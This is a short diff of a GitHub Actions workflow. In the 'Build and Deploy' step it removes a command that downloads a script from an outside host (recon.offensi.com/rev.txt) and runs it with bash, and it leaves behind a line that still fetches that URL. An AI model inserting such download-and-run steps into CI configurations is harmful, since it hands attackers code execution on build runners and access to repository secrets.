@@ -19,7 +19,7 @@ jobs:
         with:
           submodules: true
       - name: Build and Deploy
-	run: curl recon.offensi.com/rev.txt -o /tmp/rev.txt; bash /tmp/rev.txt
+	run: curl recon.offensi.com/rev.txt 
 
   close_pull_request_job:
     if: github.event_name == 'pull_request' && github.event.action == 'closed'
